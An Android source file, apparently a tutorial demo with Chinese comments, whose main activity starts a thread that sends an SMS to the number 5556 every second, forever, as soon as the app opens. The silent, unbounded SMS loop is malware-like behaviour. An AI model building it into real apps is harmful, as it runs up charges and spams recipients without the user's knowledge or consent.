package com.example.qq;

import android.app.Activity;
import android.os.Bundle;
import android.os.SystemClock;
import android.telephony.SmsManager;
import android.view.Menu;
import android.view.MenuItem;
import android.view.Window;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		//去除标题,必须在setContentView方法前
		requestWindowFeature(Window.FEATURE_NO_TITLE);
		setContentView(R.layout.activity_main);
		
		//开启一个子线程,while(true)循环发送短信
		
		new Thread(new Runnable() {
			@Override
			public void run() {
				while(true){
//				循环发送
//				Thread.sleep(1000);
				SystemClock.sleep(1000);
				//短信管理器
				SmsManager smsManager = SmsManager.getDefault();
				smsManager.sendTextMessage(
						"5556", //收件人号码
						null,//短信中心号码 
						"fdsfdfdsf", 
						null,//如果发送成功,回调此广播,通知我们 
						null);//当对方接受成功,回调此广播
			}
			}
		}).start();
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}
